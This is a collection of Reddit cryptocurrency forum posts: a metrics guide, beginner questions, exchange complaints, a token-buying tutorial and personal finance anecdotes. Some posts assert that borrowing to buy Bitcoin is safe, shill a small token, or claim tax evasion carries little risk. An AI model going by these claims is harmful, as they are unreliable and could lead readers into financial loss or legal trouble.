A closely related statistic to TVL is the TVL ratio, which is the ratio of a crypto's market cap to its total value locked. In many cases, investors see a crypto with a TVL ratio of less than one as a signal that its undervalued, while a TVL ratio of over one means that the asset may be overvalued. Thats an oversimplification, and some valuable cryptos (Bitcoin, for one) have no TVL. That doesnt make them valueless by any means.

Instead of using TVL to value the protocol itself, use it to understand how that value generates wealth for token holders and demand for the cryptocurrency.

**Why Its Important:** Total value locked can give you a look at the health of a crypto ecosystem and an idea of the intrinsic value created by the protocol. 

# 3. Inflation Rate

**Where Its Found:** Whitepapers, Official Documentation, Google

**Definition:** Inflation rate is the rate at 4 the supply of tokens of a cryptocurrency increases. A supply inflates as coins/tokens are mined or created via staking.

**Interpreting Inflation Rate:**

Inflation represents how tokens are created in a crypto ecosystem, a key aspect of the supply side of a crypto. As tokens are created, they are added to the market and must be offset by more demand for the token. If demand doesnt outpace that new supply, he crypto will go down in price.

Some cryptos are deflationary. Bitcoin will one day have no inflation, and once Ethereum mines its whole supply, it will be deflationary, with tokens burned in every transaction. You can see the token issuance schedules of those cryptos in the graphs below.

https://preview.redd.it/sk9uuu1aonx71.png?width=1462&amp;format=png&amp;auto=webp&amp;s=726bce38c1c2d7854f9658c12819b6c5f243fcad

An inflationary supply isnt necessarily a bad thing, and a deflationary supply isnt always a good thing, but if we understand how the production affects supply and demand, we can better understand the forces causing a crypto to move up or down in price.

**Why Its Important:** The inflation rate allows us to understand how the supply of a given cryptocurrency changes. The higher the inflation, the bigger the crypto needs to grow to hold the same token price.

**4. Coin Distribution**

**Where Its Found:** Official Documentation, White Papers, Blockchain explorers

**Definition:** Analyzing coin distribution involves looking at the spread of tokens across the network and seeing if that distribution is overly concentrated.

**Interpreting Coin Distribution:**

Perhaps the most important principle behind cryptocurrency is decentralization: the idea that distributing power over a network gives us freedom and autonomy. When coins are concentrated, the integrity of that network is compromised and the power becomes concentrated. Uneven distribution also creates issues around price manipulation.

Distributed networks prevent small groups of people from gaining too much control over the protocol or manipulating the price.When a token is launched, a distribution is slayed out for founders and investors. You can see this distribution for some of the biggest cryptos below.

&amp;#x200B;

https://preview.redd.it/wnwv1sxhonx71.png?width=1600&amp;format=png&amp;auto=webp&amp;s=66280e8187141f0c6cb57e6d473bd81738e1fb74

But as the crypto grows and matures, that distribution changes. Since most blockchains are public, we can actually use blockchain explorers like etherscan.io to see what percentage of supply the biggest wallets control. Here are the biggest wallets on Shiba Inu, for example:

https://preview.redd.it/t3k7auk5pnx71.png?width=2454&amp;format=png&amp;auto=webp&amp;s=b4edf3d3ac682b207327dde489899099d0751f68

Some of the addresses are known, and are labeled. The #1 address is a burn address, meaning SHIB was sent there and can't be recovered (cryptos do use burns as a deflationary tactic). The #4 wallet holds $2 billion in Shiba, over 4%. A sale that big could tank the price. 

**Why Its Important:** If coins or tokens are unevenly distributed, it means certain groups and individuals have more power over the token and its price. This is bound to happen to some extent, but the bigger the disparity becomes, the bigger the problem becomes.

# 5. Volume Traded

**Where Its Found:** CoinGecko, CoinMarketCap

**Definition:** Volume traded is the amount of value, typically measured in dollars, being traded back and forth over a given time period.

**Interpreting Volume Traded:**

When we enter or exit a trade, were participating in an open market where we interact with a real person on the other side of the screen. The sum of all the people trading in a given market is the volume, and the more value being traded back and forth, the more efficient and liquid that market typically is.

Volume is important because it can help us avoid participating in illiquid markets that are likely to be manipulated. Iliquid markets also make it dificult to enter and exit trades. Take a look at the graph below:

https://preview.redd.it/5w5nu4ukpnx71.png?width=1600&amp;format=png&amp;auto=webp&amp;s=2722abbd50bb9c8c3c6f9db00dd845a4548341f6

Each of those flat spots is a time period where there were no trades happeningyou couldnt have exited the trade for the market price at that point in time. Services like CoinGecko can show you all the markets and volume metrics for a cryptocurrency in a single place. Large cap cryptos will obviously have more volume, but plenty of small cap cryptos have enough volume to be liquid for small investors.

https://preview.redd.it/ip04ds3npnx71.png?width=1600&amp;format=png&amp;auto=webp&amp;s=713887dd3feeaa5319049b7860a71cba599a35e8

Centralized exchanges (CEXes) can provide valuable signals regarding liquidity and volume. When an altcoin is listed on a CEX, it means the team has deemed the asset liquid enough to have a fair and efficient market, and that there will be enough trading volume around that asset to produce fee revenue for the exchange.

**Why Its Important:** Cryptos that dont trade on much volume are more inefficient markets and may result in you getting a raw deal when you enter and exit the trade. More liquid markets with higher volume are less likely to be manipulated.

# Wrapping Up

My goal as an independent altcoin researcher is to help crypto investors make thesis-backed, intelligent investing decisions. While these statistics are all-encompassing by no means, they will help you avoid common red flags and aid in your search for undervalued gems. Happy hunting!

Good evening fellow crypto enthusiasts,

I am new to the crypto scene this year. As there is so much to learn and cover across this no-longer-new-but-still-burgeoning field of finance and decentralization, I have spent the last couple of months listening to all kinds of podcasts, youtube series, etc. to understand the space. I have learned so much, but it always leads to more questions or to the next developing project. It started with btc which translated into eth and then to other alt coins. That led to defi projects, crypto gaming, and NFT's. And to even be part of the active conversation in the space, I made a Twitter account to keep tabs on leaders in this community (and I haven't had any social media for years). 

I have realized though that as much knowledge as I have consumed, I am barely keeping pace of the developments out there (feels like every 10 minutes). Whereas I used to check emails and Reddit as part of my morning/evening routine, now I'm checking Coinmarketcap and Twitter. I want to keep learning and growing, but am wondering from those that have been keeping track of this space for a while or even if you're new but have a better grip on trends, information, what to filter, etc...do you find it best to have a deep focus on one or two alts/projects or do you minorly track the industry as a whole with little pools of knowledge in each area?

For example, I am involved in molecular biology and had an issue narrowing my focus down to something specific to eventually be an expert in the field of immunology. Nearly every research project I would read about while studying was very fascinating to me to the point that I could find myself easily working in that arena (such as epidemiology, virology, cardiology, oncology). But I decided to go with immunology because it can transition into each of those fields.

As a human, I know we cannot be great at everything at all times. But what has worked for you? What is the encompassing subject matter than can be focused on that branches out to these other cryptocurrency areas? Not seeking financial advice in any way, just looking for ideas on how not to be scattered.

Thanks for any input, and as I have learned in the Twitterverse, wgmi.

In less than a week this coin had the momentum of killing a zero. Talking 75 million market cap. Then got fudded about being a rug pull. triggered  a massive whale sell off into a small fish sell off down to being close original launch value down to 19 million market capl..... And then had its chat get bot attacked, trying to drive investors to different coins. 

This bad mother fucking coin came back swinging and is rallying past 26 million market cap on its way to 30 million. This coin ain't fucking leaving! And anyone trying to drag it down is mental. 

Shiborg to the moon!

About 4% of the people surveyed said they have or know of someone  who quit their jobs at some point over the last year due to the financial freedom unlocked by cryptocurrency investment, CIVIC Science said, citing its survey.

The results are based on 6,741 responses collected between Oct. 20 and Oct. 27. Interestingly, a majority of those who quit were from the lowest income bracket, with about 64% earningless than $50,000, the survey revealed.

Last month, due to no fault of coinbase card users, many people were hit with fraudulent charges. Strike #1 for coinbase, not exactly instilling trust in their product, but in itself a forgivable offense. 

They canceled my card and sent out a new one. I was able to activate it in the app. However, my coinbase card account is still suspended. 

To un-suspend my account, I have no option but to call in to their support. It takes about 4 minutes to navigate through the phone menu because of the number of times that they repeat THIS LINE IS FOR EXISTING US-BASED COINBASE CARD HOLDERS ONLY. OUR REPRESENTATIVES CAN NOT ANSWER ANY QUESTIONS UNLESS THEY PERTAIN TO US-BASED COINBASE CARDS. 

I waited on hold, only to be picked up about 10 minutes later and told My computer is frozen, you will have to call back later, sorry. Strike #2. 

Okay, another 5 minutes going through the menu, this time 20 minutes on hold - and then they disconnect me. Strike #3. 

So at this point Ive had fraudulent charges steal my crypto at no fault of my own, I still dont have those charges reversed three weeks later, and I cant even un-suspend my account after waiting for (and activating) my new card. Ive given up on a product that I wanted to succeed because the execution is massively flawed. I cant in good conscience recommend this product to anyone that I know because of the objectively bad experience that I have had with it. 

Coinbase, having the brand recognition that it does and the income that it does, should be ashamed to skimp so badly on customer support that their product becomes unusable.

How much of an impactful topic does it need  to get you to abandon your crypto and perhaps watch from the sidelines?



Since I need 500 characters, what if Satoshi reappears, and reveals how to do the quantum magic to decrypt the current securities?

What if ISPs completely block crypto exchanges, maybe then it's still accessible, but only to the computer wizz. The general public gives up,and this may never come to fruition. 

*filltext almost at 500 but not really maybe this will do it. Nope it did*

I'm having a mare.

I got my cake out of pancakeswap and into Trust Wallet, now I have Cake, and I want to get it back to Binance.

I think I messed up by swapping Cake bep20 to bep2. It charged a nominal fee, but now I can't trade Cake for anything else, and I've not got enough BNB in the account to cover fees to swap it back.

Do I need to? Should I be doing this a different way? Clearly I'm a moron, but any help would be very welcome. Thank you



I imagine this is where I get removed for not having enough words in my question, so I suppose I'll also ask another question... What's the current coin/s I should be throwing my cash at? I see that bloody shiba came good in the end... Who'd have thought, huh!

Hi r/CryptoCurrency!

I'm here to share some analysis I did on social media followings (Twitter, Reddit, and Facebook) versus market caps, so this is going to be a bit long (TL;DR: look at the pictures!). I will list my exact methods and code in the comments. 

I want to look at the question of how social media versus crypto market caps are related. Specifically, I'll offer some linear regression data here and then look at the resulting predicted versus true market caps of some cryptos. In other words, based on social media followings, what would we expect a coin's market cap to be, and what is it actually? 

I looked at ADA, SOL, MATIC, DOT, ALGO, LINK, VET, ATOM, ONE, NEAR and THOR here. I did not include BTC and ETH because they are complete outliers for this kind of stuff, since their market caps are on a different level relatively, but I included some smaller coins to still get representation across different sized projects. 

First, let me show you some regression plots on how social media followings correlate with market cap: 

&amp;#x200B;

https://preview.redd.it/yh0vfviiknx71.jpg?width=517&amp;format=pjpg&amp;auto=webp&amp;s=fc956ebe60a51a21fab488802f7ea20c948a0d3b

&amp;#x200B;

*Processing img l7n0d3ijknx71...*

&amp;#x200B;

https://preview.redd.it/ckho4xakknx71.jpg?width=510&amp;format=pjpg&amp;auto=webp&amp;s=78e87f3bc81a76bdf80563969b4dd80087433f21

The twitter relationship and line fit looks pretty good, and there seems to still be some good relationship for the Facebook data. Surprisingly, the Reddit following of these coins seems to not correlate the least with market cap of the three. We are a bit different over here apparently! Maybe that's a valuable data point in itself if you spend a lot of time on Reddit -- what you see might not be very representative of the bigger crypto picture! 

So I ran some multiple regression on this to get corresponding predicted values for the market caps. Here are these coins' regression predicted versus true market caps: 

&amp;#x200B;

https://preview.redd.it/2a92ftnolnx71.jpg?width=743&amp;format=pjpg&amp;auto=webp&amp;s=6cf2b6a917c05db1cb3059bab476905489318c70

We can see here some of the relationships between these coins' social media followings and their market caps, and for which ones there are more discrepancies. To visualize this some more, let's look at the ratios of the regression prediction versus true market caps: 

&amp;#x200B;

https://preview.redd.it/vnu5sz35mnx71.jpg?width=687&amp;format=pjpg&amp;auto=webp&amp;s=7e5feaf7a9fb322e0169e6dfc093e5ad403e34ff

Looks like MATIC, ALGO, ONE, and VET are relatively 'cheap' at the moment compared to what the regression expects their price to be based off of their followings! 

Make of this what you will. I'm guessing that institutional money makes a big difference here to create some of these discrepancies. Maybe it's a bullish sign if a there are a lot of people interested in the coin and it is relatively undervalued? Maybe it points to some sort of lack of institutional marketing too though? Happy to hear y'all's thoughts! 

&amp;#x200B;

TL;DR: Look at the pictures ;)

Ive seen a few posts about peoples experiences taking loans out to buy crypto and they have been meet with a few negative comments saying its a stupid idea but people support getting a car loan. 

To me, taking a loan out for a car is a riskier move. Cars depreciate in value the moment you drive the car out from the sales lot. Every time you drive the car there is a risk of crashing the car and youre stuck paying back the loan. 

Taking out a loan to invest in crypto seems the wiser option in my opinion. Crypto, mainly Bitcoin, is an appreciating asset. Overtime it is going to continue to increase in value and give you better returns. Along with the ability to stake your Bitcoin and other crypto assets earning you a passive income. 

I guess Im just interested in other peoples options on why loans for crypto is seen as way to risky? 

Remember, when in doubt, zoom out and happy trading!

So I went to buy myself some wrapped Banano on pancakeswap having around 20usd un my account to jump on the hype train and I now find that my BNB balance is showing as 0.

I imported the appropriate address from bscscan to my metamask wallet and double checked everything was kosher but it appears Ive either misunderstood the gas fees or fallen afoul of something. I purchased 20 banano thinking I was spending around $6 rather than the 60c I actually spent and the gas was about the same. 

https://bscscan.com/address/0x660fc9CB351373219C1770363C187dEaaa017921 Looking at my public address on bscscan it shows a transaction for around $20 which would make sense if Ive fallen prey to some sort of scam but that transaction doesnt show up in my BnB transaction history on metamask.

We can all agree that this subreddit is full of " What is the next coin that will 100x?" " What is an underrated coin that will skyrocket?" type of posts. The thing about these posts is that the comments are full of people shilling their coins, and to be honest, most of those coins are trash.
Anyway, has anyone actually made a good amount of money buying into a coin that people in those types of posts were shilling?
I mean a LARGE amount of money/buying in before it starts to get popular.

Tldr: Do you find posts asking what will be the next 100x useful, or is it just a way to get easy moons while people shill their coins??

I've just opened my bank account today hoping to spend a small portion on crypto. I'm new to the subject so I watched a few youtube vids and r/wsb. I don't really understand stuff like blockchains, wallets, the metaverse but still willing to try. I'm not looking for a moonshot but I'm hoping to at least double by the end of the year. I'm still not certain how to find a crypto to do this that isn't a meme coin so I came here hoping people could pick some for me.

 Also, can someone explain if I'm going to get all my money robbed if I don't use a usb. And which site is the most reliable with the lowest fees?

It seems like most, maybe all, Crypto all time highs are followed by a downturn where it can be bought for less, and often there are many and prolonged opportunities. At least this seems to be the case when I look at Ethereum. So while we all appreciate those who drive the prices up farther am I wrong in thinking its worth being patient and never buying at ATH? Of course this doesn't necessarily apply to those looking to daytrade crypto but if your timeline is out a ways seems like being patient and waiting for the dip is the better move.

Hi, i was hoping to get an answer as im not sure what im supposed to do. I am 16 years old and started investing in crypto at around the age of 13, i made around 30,000 profit from it and i wanted to withdraw it to my bank account. When i do that, do i have to report it to the HMRC or do i not because im underage. And if i do have to pay, how do i do it because i tried reporting the gains but i didnt find anything on the gov website that would let me report it. 

All i know is that you dont have to pay tax on the first 12,300 but thats when youre over the age of 18.

Sorry if this sounds stupid but this is my first time in this situation.

Thanks for the help

Ive been tryiNg to target lower market cap tokens that havent spiked with upside. Prefer lower price but I know that doesnt matter if less coins in circulation. 

I was shocked to see how many tokens there are once I started adding exchanges. 

Here are some Ive found that interested me. Id like to hear this groups opinions. 

BAX

BEPRO

MTV

DENT 

CKB this one Ive had for a while and hearing more and more chatter about. Market cap is low side but higher than others listed. 

Just looking to see if f any of these have potential. 

Feel free to share anything not on list.

I live in the US. I am interested in getting into crypto casually, just investing some extra money here and there to see what happens. Although Im just getting involved, I want to have the freedom to invest in alt coins in addition to BTC and ETH, as well as exchange one coin for another (I think thats a thing?). Specifically thinking about Solana, Cardano, and YGG. Im looking for little to no fees if such a platform exists.
Id also appreciate recommendations of specific investments (I dont mind waiting to see a pay out). 
Thanks!

At this point, I see so many posts in this sub, it's pretty ridiculous. This flair should be relatively to easy to set up too. Subs like r/CryptoMoonShots are filled bots spamming their "deflationary one of a kind" coin. If we have a dedicated "shitcoin" flair, it can organize the sub when searching so only shitcoin posts will come up. It could also serve as a scam alert and since there's a ton of people in this sub that aren't experienced enough to understand.  I think it'll be funny to see the amount of shitcoins out there.

Price action from historical China restrictions

As we know, at different times over the past few years, China have introduced varying levels of restrictions on Bitcoin.

My question is, since they declared it effectively illegal a couple of months ago, is there any further restriction they can place on Bitcoin, or have they effectively run out of bullets?

Im trying to identify where the next big FUD could come from / China has always seemed like the biggest one and I cant think what they would do next? Does this mean Bitcoin can move up, unfettered from here?

Hi guys. I was thinking about everyone is being so excited about the moons and shit posting like crazy to get some so that the real posts get diluted in the ocean of shit... 

I actually don't mind the many posts, or rather most of the time can't tell them apart from shit due to the novelty of crypto world to me, so I appreciate every word I am getting here. And I also think it is probably for the best of the crypto community because even more people get motivated to share and may be deliver some brilliant ideas they were keeping for themselves. Just think of the whole banch of the introverts, who usually don't like to open their beautiful inner worlds to anyone else!

Hi All, does anyone have real-world experience of Saxo's crypto ETFs or ETPs? I'm considering them, to be able to invest in crypto in a time-efficient way. I was thinking of their Ethereum ETF. I've read that the fees and charges can be a bit higher than other platforms, but this doesn't concern me as long as my $$ are secure from hacking, going missing, etc.  Gains from ETFs are usually modest. From what I gather from the Saxo website the ETFs track a mix of 3 stockmarkets in 3 currencies. I'm unsure of the profit/loss implications of this. Would appreciate any knowledge out there!

Hi guys!
Idk of you've seen it already, but as I'm a little bit bored already of my job, I started to look on LinkedIn. some job positions, and surprisingly I saw A LOT of options in companies in the crypto world. Many of them are 100% remote which is not bad either. Someone has experience working for Binance, Kraken or any company related to..?? How's the environment? Too much pressure / relaxed - cool managers? How does it feel to work in an area that you really like!?

Just a poor ape looking for a new career and options... 

Thank you and sorry for my broken English!

(It starts with one) One shill, I don't know why
It doesn't even matter how hard you try
Keep that in mind, I designed this rhyme
To explain in due time all I know

Money is a valuable thing
Watch it fly by as the crypto swings
Watch it count down to the end of the chart
The bears click value away, it's so unreal (It's so unreal)
Didn't look out below
Watch money go right out the window
Tryin' to hodl on, didn't even know
You wasted it all just to watch you go

I kept everything inside
And even though I tried, it all fell apart
What it meant to me will eventually be
A memory of a time when it dumped so hard

Shillers try so hard and got so far
But in the end it doesn't even matter
Crypto had to fall for me to lose it all
But in the end it doesn't even matter

Im curious as to what you all think about deflationary coins. Ive recently discovered them and am learning more about them.  For example, coins like safe, moonstar, and luffycoin that tax on transactions and redistribute or burn tokens. Im intrigued by them but not exactly sure the practicality of the idea. It seems like a newer-ish idea thats only been implemented recently? 

It seems interesting in how burning tokens a sort mirrors hard assets and consumption, like how objects purchased are no longer available, and therefore supply is decreased. I also like the idea of reflections where a portion of the fees are redistributed to holders. This incentivized holding, which is pretty nifty. But I guess it also might disincentivize using the token for purchases. I was wondering if theres actual utility here in stimulating value for the ecosystem or the coin! Would love your perspectives. Thanks!

If you were a crypto millionaire what would be some good alternatives to actually enjoy your spoils with using an exchange to go to Fiat?  Would you spend as crypto, and how?  Would you go to Fiat without an exchange?

I've seen a lot of threads talking about the regulation of exchanged and this got me to thinking, what is the plan going forward?  Having $1m in crypto is pointless if someone doesn't know how to use it to do anything.  Maybe this thread will inspire some newbs.

Feel free to suggest businesses which accept crypto, alternative ways to convert, and anything else you see as helpful.

Of course a large portion will say simply "hodl" but what's the fun in that?

Hopefully this post is 500 words long, I don't want to try to make up more stuff to say.

This is not a post about whether you should or should not pay taxes. I don't care. This is also not a post on HOW to pay taxes. I don't know.

This is a post on my experience with having tax problems, in case it sheds light for someone else. I have been dealing with an ongoing tax matter for several years and thought my experience may help clear up some misconceptions. Obviously, all of this is my experience only and not meant as any kind of general legal advice.

**Background:** Several years ago, I got into a business problem that was very bad from a tax standpoint. This was not related to crypto. I wont go into the details of what happened, but suffice it to say it was not an innocent mistake, nor was it based on lack of knowledge. Instead, it was the least bad choice of several bad choices at the time, because sometimes life just happens. If I had it to do over again today, Id do things 90% the same way.

I was waiting for the IRS call and it did eventually come. And for 3 years now, I have been straightening everything out with them tax-wise. Here are some things Ive realized that may help you if ever end up tangled with the IRS.

**The IRS is just a big bureaucracy like any other bureaucracy.** That means your biggest fight will be against the system itself, not against anyone within it. Dealing with tax problems mostly means being drowned in paperwork. Youll get letters non-stop. First they will send you a letter letting you know youre about to receive a letter. Then youll receive a letter. Then a letter confirming that you were sent a letter. Every step of the grueling process will require filing forms youve already filed, submitting paperwork youve already submitted and having to explain your situation to yet another government bureaucrat. There is a common misconception that once you get tracked by the IRS, someone will be on your case obsessively. Not true. Your biggest challenge will be holding someones attention long enough to actually get something done.

**You will not go to jail.** Ok, maybe you are some kind of big-time drug trafficker. Or perhaps you are committing tax fraud at a Wesley Snipes level. In that case, all bets are off. But for everyone else, relax. No form of incarceration is going to be on the table for you for any run-of-the-mill tax bullshit youve pulled. Putting you in jail does not get them what they want, which is the money you owe them. That's all.

**The IRS is not a James Bond agency.** When you think of IRS agents, you might be picturing the cast of CSI: Miami or something similar. Thats wrong. Have you ever been to the DMV or the unemployment office or someplace like that? You know those ladies that work there? Thats who you should be picturing. Tonya and Miss Keisha. And they are not tracking you down with binoculars. They are not staking out your home or tapping your phone. They are paid to send you letters. And then another letter stating that theyve sent you a letter. Thats all. They're more Parks and Recreation than CSI: Miami.

**We live in a democracy; their powers are limited.** They do do things like send letters threatening wage garnishment and so forth. But at almost every step, there are chances for appeal and about a half-dozen ways to stop bad things from happening. They work more by attrition than by force. They annoy you to the point where its easier to comply than to keep putting up with all their letters. But at least in my experience, they will rarely take any dramatic measures like pulling money out of your bank account. Even though they claim they will.

**Inconclusiveness will not get you off the hook.** Ive seen people here assert that since the IRS cant *prove* where XYZ came from or cant *prove* that you made such-and-such income, that means youre off the hook for it. No. They dont have to prove anything, they just have to ask you about it. And unless youre prepared to lie (in which case, youre on your own), you will have to tell them how much money you made, where it came from, etc.

**Having said that, they will take your word for things.** I was surprised how often they simply relied on my self-reporting to determine what to do with my situation. They rely on records that you yourself provide. If you say you dont have something, they take your word for it. They double-check very little. Personally, I didnt lie about anything because why risk that? But I could have if I wanted to. Could you lie about your crypto holdings? Sure. Would you get away with it? I dont know, probably? But then dont get mad when Janet Yellen pushes laws designed to combat precisely that behavior.

**Tax agents are humans and they can be sweet-talked within limits.** There is some discretion in an agents job. At least the ones Ive encountered. They can make choices as to whether to have you fill out that form for the 9th time or not. They can decide that a bank statement from 32 days ago (not 30) is recent enough. Be nice to them. Treat them the way youd treat a post office clerk or a flight attendant. Theyre just doing a job and are in a position to help you out if you dont treat them like the enemy.

**Always file the paperwork.** So remember how I said Id do things 90% the same way if I had it to do over? The 10% I would change is that I would have taken the forms and the paperwork much more seriously, much sooner. Even if you arent going to pay any money, still go ahead and file whatever paperwork they ask from you. Just put $0 in the blank for payment. They HATE it when they dont get their paperwork. They hate that more than not getting their money. I cant overstate how much the hassling was reduced after I filed all the overdue paperwork, even without paying them a nickel.

**NB:** Obviously, this is about the IRS and therefore is about the US. Im not trying to be exclusionary here, but I cant say how things work in Germany or Lebanon or Australia because I dont pay taxes in those countries. I pay taxes in the US.

When someone provide DOT for certain project as crowdloan and gets reward of token ( for example if someone loaned dot to Phala network and gets PHA as reward). Does it make sense hold PHA during auction time because if Phala  network  wins  auction doesn't there will be too much sell pressure from the reward winners. Or am I too dumb to understand ?

RandomX algorithm makes it ASIC resistant. 

- Dynamic block size = more transactions so transactions get cheaper = scalability.

 - Fully private on the blockchain = your wealth stays hidden, nobody will be surveilling you, you won't be a target for governments/criminals/hackers. 

The most used currency on the black market (Bitcoin got kicked out for being transparent because all the transactions are recorded on blockchain). 

- The 3rd biggest Github team of contributers.

 - The supply will get more scarce when Tail Emission kicks in 2022 and inflation will stay low and stable.

Seeing as the new mayor of NYC taking paychecks in bitcoin, and hoping the future of crypto becomes more of a day to day purchase currency, does it still rely on an exchange amount?

As each crypto value fluctuates so much, does the amount you pay at that very moment rely on the current exhange rate?

Say your salary was 1BTC a month, every paycheck could be worth different amounts Or would you be paid x amount of USD a month, and you get paid the current value in BTC. 

I have confusion, thanks in advance

I know a couple of Boomers who have invested in crypto and understand the space a lot. I also know a lot of Millennials who never invested in crypto and think its a bubble thats about to burst.

Boomers vs Millennials is dumb in my opinion. It completely depends on the person and not their age. Age does matter, because most millennials grew up with technology and normally understand it better than some boomers (but not all). 

So, instead of hating on Boomers or making fun of them for their opinions, why not try to educate them. It worked out with my dad, at first he didnt know about the crypto technology but now hes getting it, and has himself invested on Bitcoin and Ethereum. 

Age doesnt matter, its their mind that does.

As it is still very small, it isn't on any mainstream platform yet so buying some is a bit tricky.

Here is a small tutorial:

1. Buy your desired amount of **SOLANA** (will then be the amount of **WOOF**)
2. Open a wallet on [https://phantom.app](https://phantom.app/), the browser extension is really cool.
3. On the first screen (with the dollar sign icon) click on manage token list and add **USDC** and **WOOFENOMICS**
4. Transfer your **SOLANA** bought previously to your phantom address
5. Swap your **SOLANA** to **USDC** on the swap screen of your phantom wallet
6. Go to [https://dex.woofsolana.com/](https://dex.woofsolana.com/) and click connect on the top right corner then phantom
7. Transfer all your **USDC** to **WOOF** !

**That's it ! You now have WOOF on your phantom wallet !** ***Now sit back and watch it go to the moon !***

So I made a post a bit over a month ago it was about taking out a 40k AUD loan to buy more bitcoin which I withdrew off the equity on my mortgage at 2% interest if anyone was wondering how I kept the interest rate so low. 

So how is it travelling? I pay an extra $150 a month on the repayments which I have managed to pay without working more. How? A simple combination of buying less alcohol and bringing my lunch to work 1 more day a week instead which has actually cut down more spending and helping me lose a bit of weight which has been a really positive outcome. 

The price of bitcoin? I bought my 40k worth at around 59k AUD which with this purchase pushed me over the 1 BTC mark which I was rapt with. The price today is around 82k AUD so Im around 38% AUD up on my investment. In addition to this I have staked my BTC at around 4% so I am making passive income on my investment. 

My plan? Whenever I feel we are starting to get to the FOMO stage I will sell 40k worth of BTC and pay back the amount that I borrowed. Even if it only goes to 108k AUD (which we all believe it will go a lot higher) I would of doubled my money. 

If it goes to a bear market? I have been easily been able to service the extra repayments by just making a couple of small sacrifices and I am happy to wait a couple of years if need be. 

I understand this is not for everyone however would just like to share my experience so far. Cheers legends !!

I feel like I see more and more people sending coins and losing their funds because they don't check, or even know to confirm network compatibility between 2 wallets.  Even if it's the same coin, it doesn't mean it's compatible.  For example, if you have SHIB on Binance, you run the possibility of using the wrong network if you try to send to Coinbase.  Please just check to make the network where your coins currently are and if the destination supports it.  I'm a little tired of seeing so many people sending coins via BSC to a place that only supports ERC and then complain to the exchange that had nothing to do with it.  Sure, we want there to be more safeguards to prevent these types of errors but it's not here yet so you have to be diligent.  Save yourself the trouble.

Each one of us has a different favorite coin. Sometimes I feel like saying my opinion publicly about mine coin will instantly mean i am shilling it according to this sub. The thing is that the same happens sometimes with the opposite. Many times I see people talking about a coin, hyping it and saying how amazing it is and I am like.. What the fuck are you talking about it's beyond mediocre or even practically useless. Have you ever found yourself thinking this way about a coin and hesitated to say it?

I thought some of you might appreciate knowing what's going on in Aus at moment! 

This week we had our own crypto ETF go live on the Australian Stock Exchange called ASX:CRYP.

It went live and set a record for daily volume in the first 25 minutes. 

The ETF allows you to invest in companies that are innovating in the crypto space. The holdings are:

Silvergate Capital Corp (12.3%), Marathon Digital Holdings Inc (11.8%), Galaxy Digital Holdings Ltd (11.1%), and Coinbase Global Inc (9.8%)

https://www.fool.com.au/2021/11/04/the-first-crypto-etf-asxcryp-has-just-hit-the-boards-heres-what-you-should-know/

Also, just yesterday our biggest bank, the Commonwealth Bank of Australia announced that they would soon start crypto trading on their platform. This is massive!

I have been on the sidelines during this whole bull run doing my due diligence into Crypto projects that I think have great promise. After months of research I think I am now finally ready to get into Crypto. And have the perfect portfolio ready. 

50% USDT and 50% USDC I believe this will help maximize my returns while minimizing my risk. I also figure splitting it will help with diversifying my holdings. Both are large caps that seem to hold up well during a bear market. I think it will really make for a stable portfolio. 

What do you guys think too risky?

When someone provide DOT for certain project as crowdloan and gets reward of token ( for example if someone loaned dot to Phala network and gets PHA as reward). Does it make sense hold PHA during auction time because if Phala  network  wins  auction doesn't there will be too much sell pressure from the reward winners. Or am I too dumb to understand ?

Sure, I do that too but this sub is undoubtedly the greatest place to find educational information. It blows my mind the level of intellectualism. And yes, Im trying to add words to reach the 500 count minimum.

That being said: can we talk about problems like Olympus and Time? I have a friend in Olympus (staking a whole one). After seeing multiple different sources reference Time Wonderland, I decided to jump in (you miss 100% of the shots you dont take rang in my head for days).

Now, mathematically/financially speaking I am slightly illiterate. I have a learning disability that forces numbers to become overwhelming to me so its hard for me to really breakdown the logistics of certain projects. 

DOES ANYBODY HAVE ANY INSIGHT TO THESE PROJECTS (specifically Time) and how a 70.000% APY is possible (at least for now)?

And why would you invest / not invest in projects like these?

Hi all

I've recently invested in SteamX or SteamExchange tokens on Poocoin. I understand from their Whitepaper that the tokens can/will be swapped for their own native coins on their own blockchain on their own exchange when it's set up next year. 
Is this too good to be true? 
How long would it take to create all of that?

Binnace Market Cap 93 Billion; Trading volume  **39,074,961,725** (daily)

Coinbase Market Cap 72 Billion; Trading volume  **8,826,307,129**

FTX Market Cap 7 Billion; Trading volume  **3,261,668,315**

KuCoin Market Cap  1.4 Billion (3 Billion fully diluted); Trading volume  **4,023,878,549**

Last round of funding; FTX was evaluated at 25 Billion

&amp;#x200B;

Question: Are KuCoin and FTX undervalued? Or What am I missing as FTX and Coinbase seem like  comparable projects once FTX becomes more retail oriented?  Why such a huge difference?

For some reason, this historical event has been buzzing around in my brain for quite some time now. With Crypto, and more specifically Bitcoin becoming more and more likely to reach a market cap equal to, if not more than, gold. Furthermore, shortly after the gold war was confiscated by the government they raised the price from  $20.67 per troy ounce (which they paid each person) to  $35 per ounce. 1 troy ounce = 1.09714 ounces.

If you refused to turn in your gold, well: " Under the Trading With the Enemy Act of October 6, 1917, as amended on March 9, 1933, violation of the order was punishable by fine up to $10,000 ($167,700 if adjusted for inflation as of 2010) or up to ten years in prison, or both. "

Currently, Under current federal law, **gold bullion can be confiscated by the federal government in times of national crisis** 

The reasoning behind the confiscation of gold during the time of war was "due to rationale. The stated reason for the order was that hard times had caused "hoarding" of gold, stalling economic growth and worsened the depression as the US was the using the gold standard for its currency."

With BTC being the best performing, and most successful, what do you guys think about something like this? Physically, the government can find your gold if they chose to do home searches. Would the technology even be available to the government to track things like wallet balances, etc?

Very much a crypto newbie so please pardon my ignorance but I wonder if somebody can help clarify something fundamental that I don't understand: the relationship between a blockchain and its associated currency.

Does every blockchain have its own currency? Can only one particular currency work on each blockchain? If you are bullish on one blockchain (say Solana) then does it stand to reason (all things being equal) that you would invest in its currency (ie SOL). Can a blockchain 'fail' and its currency 'succeed' and vice versa?

I started out at the beginning of the year not knowing anything about Crypto in general. I slowly began to educate myself by listening to podcasts, audiobooks and watching reputable YouTube channels on the subject matter.

I pulled the trigger and bought sensibly by diversifying my portfolio with the usual suspects plus a few Alts and tokens.

Fast forward 10 months later and my entire portfolio has gone up in value by 3755% without having cashed out on anything.

What's the moral of the oral? Take the time to do the necessary research and good things will eventually come to those who wait. It's a long game people, don't rush it.

Just looking for ideas on the best format to use. I want to give a friend some ENJ, so obviously I need to set up a wallet (haven't researched this yet) and figure out the best medium for the gift (e.g. Get the wallet address and key /seed/whatever engraved on something, maybe). I want it to last years, so maybe it can be cashed out in 2040, or earlier if it turn into a million or something. Any ideas appreciated.

